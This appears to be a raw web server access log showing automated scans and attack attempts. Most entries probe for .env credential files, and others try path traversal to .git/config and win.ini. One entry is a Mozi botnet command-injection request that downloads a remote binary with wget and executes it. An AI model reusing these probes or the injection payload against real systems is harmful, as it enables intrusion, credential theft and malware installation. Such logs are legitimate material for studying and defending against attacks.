135.125.244.48 - - [08/Sep/2022:21:18:57 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [08/Sep/2022:22:36:44 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [08/Sep/2022:22:36:44 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [08/Sep/2022:23:07:54 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [08/Sep/2022:23:07:54 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [08/Sep/2022:23:21:46 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [08/Sep/2022:23:21:46 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [08/Sep/2022:23:36:35 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [08/Sep/2022:23:36:35 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.92.32.88 - - [09/Sep/2022:00:02:21 +0000] "GET / HTTP/1.1" 200 32 "-" "<title>(.*?)</title>"
198.235.24.14 - - [09/Sep/2022:00:11:53 +0000] "GET / HTTP/1.0" 200 32 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
179.43.175.140 - - [09/Sep/2022:00:21:21 +0000] "\x16\x03\x01" 400 226 "-" "-"
179.43.175.140 - - [09/Sep/2022:00:21:22 +0000] "GET /static../.git/config HTTP/1.1" 404 196 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
45.95.147.53 - - [09/Sep/2022:00:27:33 +0000] "GET /Electron/download/windows/\\Windows\\win.ini HTTP/1.0" 404 196 "-" "xfa1"
39.80.202.148 - - [09/Sep/2022:00:31:02 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://39.80.202.148:45603/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 196 "-" "Hello, world"
135.125.244.48 - - [09/Sep/2022:01:35:41 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [09/Sep/2022:01:35:42 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
207.32.219.9 - - [09/Sep/2022:01:48:06 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
207.32.219.9 - - [09/Sep/2022:01:48:07 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
34.140.248.32 - - [09/Sep/2022:02:44:43 +0000] "GET / HTTP/1.1" 200 32 "-" "python-requests/2.28.1"
135.125.244.48 - - [09/Sep/2022:02:46:53 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
